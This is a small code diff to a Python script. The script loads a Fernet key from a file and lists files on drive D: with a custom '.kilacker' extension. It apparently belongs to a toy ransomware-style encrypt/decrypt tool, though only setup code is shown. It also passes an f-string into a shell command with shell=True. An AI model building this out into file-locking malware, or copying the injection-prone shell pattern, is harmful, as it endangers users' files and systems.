@@ -2,12 +2,14 @@ import os
 from subprocess import check_output
 from cryptography.fernet import Fernet
 
+desired_format="txt"
+
 key_file = open("key_Files.txt","rb")
 key = key_file.read()
 # create class with key
 key2 = Fernet(key)
 #get files list
-fille = check_output("D: && dir /S /B *txt.kilacker",shell=True).decode().split()
+fille = check_output(f"D: && dir /S /B *{desired_format}.kilacker",shell=True).decode().split()
 
 key_file.close()
 
